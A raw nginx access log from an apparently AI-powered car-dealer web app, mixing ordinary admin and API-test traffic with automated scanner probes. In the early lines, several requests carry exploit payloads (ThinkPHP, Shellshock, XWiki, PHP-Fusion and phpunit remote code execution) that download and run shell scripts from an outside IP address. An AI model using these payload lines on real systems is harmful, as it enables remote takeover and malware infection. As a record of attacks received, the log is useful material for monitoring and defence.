nginx-1  | 172.31.0.1 - - [12/Nov/2025:03:09:41 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:03:58:30 +0000] "GET /.git/config HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:01:39 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:13:04 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:13:53 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:19:19 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:19:26 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9C\x1FR\xC2'ZSY\xD9\x9C\xC3\xD0cR.\xB6\x85:\xA1\x99(\xD7Z,\x99\xFE\xE6<\xB2\xB8\xBD\xD9\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:26:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:28:50 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:32:51 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:38:26 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:41:21 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:45:14 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:15 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:15 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%29%7Csh HTTP/1.1" 301 169 "-" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:15 +0000] "GET /public/index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%29%7Csh HTTP/1.1" 301 169 "-" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:15 +0000] "POST /index.php?s=captcha HTTP/1.1" 301 169 "-" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:16 +0000] "POST /cgi-bin/login.cgi HTTP/1.0" 301 169 "-" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:16 +0000] "GET / HTTP/1.1" 301 169 "-" "() { :; }; /bin/bash -c \x22(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\x22& # bang2013@atomicmail.io" "-"
nginx-1  | 172.31.0.1 - admin [12/Nov/2025:04:46:16 +0000] "POST /cgi-bin/cgi_main.cgi HTTP/1.1" 301 169 "http://45.93.5.244/cfg_system_time.htm" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - admin [12/Nov/2025:04:46:16 +0000] "POST /cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4= HTTP/1.1" 301 169 "http://45.93.5.244/cgi-bin/server/server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:16 +0000] "POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1" 400 157 "-" "-" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:16 +0000] "GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%5B%27sh%27%2C%20%27-c%27%2C%20%27wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.sdu.sh%7Csh%27%5D.execute%28%29.text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D HTTP/1.1" 301 169 "-" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:17 +0000] "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 301 169 "-" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:46:17 +0000] "GET /infusions/downloads/downloads.php?cat_id=$%7Bsystem(wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.wcr.sh%7Csh)%7D HTTP/1.1" 301 169 "-" "Mozilla/5.0 (bang2013@atomicmail.io)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:50:40 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:54:34 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:04:54:41 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03yA\xB0\xC8!\xC0\xA8\xBF2\xC3*\x12\xDA&\xF0\x19*\xED{S\xDB\x98\x9CqJ\x0B" 400 157 "-" "-" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:01:33 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:03:10 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:15:38 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:18:00 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:23:09 +0000] "GET /cgi/conf.bin HTTP/1.1" 301 169 "http://45.93.5.244:80/mainFrame.htm" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:28:04 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:34:26 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:40:33 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:50:14 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; ModatScanner/1.2; +https://modat.io/)" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:50:52 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:05:52:43 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:05:13 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:07:04 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:07:53 +0000] "GET / HTTP/1.0" 301 169 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:23 +0000] "GET / HTTP/2.0" 200 84711 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:23 +0000] "GET /api/chat/chats/undefined?user_id=web-user HTTP/2.0" 405 31 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:23 +0000] "GET /api/auth/me HTTP/2.0" 401 43 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:23 +0000] "GET /api/chat/chats/undefined/messages?user_id=web-user&skip=0&limit=100 HTTP/2.0" 422 158 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 2025/11/12 06:08:43 [crit] 29#29: *168 SSL_do_handshake() failed (SSL: error:0A0004E7:SSL routines::reason(1255):SSL alert number 255) while SSL handshaking, client: 172.31.0.1, server: 0.0.0.0:443
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:43 +0000] "POST /api/auth/token HTTP/2.0" 200 189 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:43 +0000] "GET /api/auth/me HTTP/2.0" 200 161 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:43 +0000] "GET /api/ai/settings HTTP/2.0" 200 172 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:43 +0000] "GET /api/chat/chats?user_id=admin@example.com&skip=0&limit=50 HTTP/2.0" 200 42 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:43 +0000] "GET /api/chat/history?user_id=admin@example.com HTTP/2.0" 200 62 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:43 +0000] "GET /api/chat/history?user_id=web-user HTTP/2.0" 200 62 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:47 +0000] "GET /api/admin/articles?skip=0&limit=200 HTTP/2.0" 200 63 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:50 +0000] "GET /api/ai/quality/metrics HTTP/2.0" 200 157 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:52 +0000] "GET /api/ai/orchestrator/models HTTP/2.0" 200 482 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:08:52 +0000] "GET /api/ai/orchestrator/performance HTTP/2.0" 200 69 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:09:22 +0000] "GET /api/ai/orchestrator/models HTTP/2.0" 200 482 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:09:52 +0000] "GET /api/ai/quality/metrics HTTP/2.0" 200 157 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:09:55 +0000] "GET /api/domain/settings HTTP/2.0" 200 75 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:09:56 +0000] "GET /api/import/list?limit=100 HTTP/2.0" 200 70 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:09:57 +0000] "GET /api/voice/settings HTTP/2.0" 200 122 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:09:58 +0000] "GET /api/auth/users HTTP/2.0" 200 163 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:10:00 +0000] "GET /api/parser/cars?skip=0&limit=20 HTTP/2.0" 200 57 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:10:00 +0000] "GET /api/parser/status HTTP/2.0" 200 166 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:10:01 +0000] "GET /api/documents/ HTTP/2.0" 200 63 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:10:03 +0000] "GET /api/admin/cars?skip=0&limit=200 HTTP/2.0" 200 11450 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:10:03 +0000] "GET /api/admin/cars?skip=200&limit=200 HTTP/2.0" 200 10377 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:10:03 +0000] "GET /api/admin/cars?skip=400&limit=200 HTTP/2.0" 200 7970 "https://localhost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 YaBrowser/25.10.0.0 Safari/537.36" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:11:17 +0000] "GET /docs HTTP/1.1" 404 124 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:11:17 +0000] "GET /docs HTTP/1.1" 404 124 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:11:17 +0000] "GET /api/ai/orchestrator/models HTTP/1.1" 200 494 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:11:18 +0000] "POST /api/ai/intelligent-search HTTP/1.1" 400 326 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:11:18 +0000] "POST /api/ai/interpret-query HTTP/1.1" 422 96 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:11:25 +0000] "GET /api/search/es/cars?q=Mercedes+%D0%B4%D0%BE+3+%D0%BC%D0%B8%D0%BB%D0%BB%D0%B8%D0%BE%D0%BD%D0%BE%D0%B2&max_price=3000000&use_intelligent_search=True&limit=5 HTTP/1.1" 200 1488 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:12:23 +0000] "POST /api/ai/car-dealer/query HTTP/1.1" 499 0 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:13:24 +0000] "POST /api/chat/message HTTP/1.1" 499 0 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:13:24 +0000] "POST /api/ai/finance/calculate HTTP/1.1" 200 209 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:13:24 +0000] "GET /api/ai/dialogue/history?user_id=test_user_123&session_id=1&limit=10 HTTP/1.1" 200 102 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:13:24 +0000] "GET /api/ai/quality/metrics HTTP/1.1" 200 168 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:13:54 +0000] "GET /docs HTTP/1.1" 404 124 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:14:20 +0000] "GET /docs HTTP/1.1" 404 124 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:14:20 +0000] "GET /docs HTTP/1.1" 404 124 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:14:20 +0000] "GET /api/ai/orchestrator/models HTTP/1.1" 200 494 "-" "python-requests/2.32.5" "-"
nginx-1  | 172.31.0.1 - - [12/Nov/2025:06:14:20 +0000] "POST /api/ai/intelligent-search HTTP/1.1" 400 326 "-" "python-requests/2.32.5" "-"
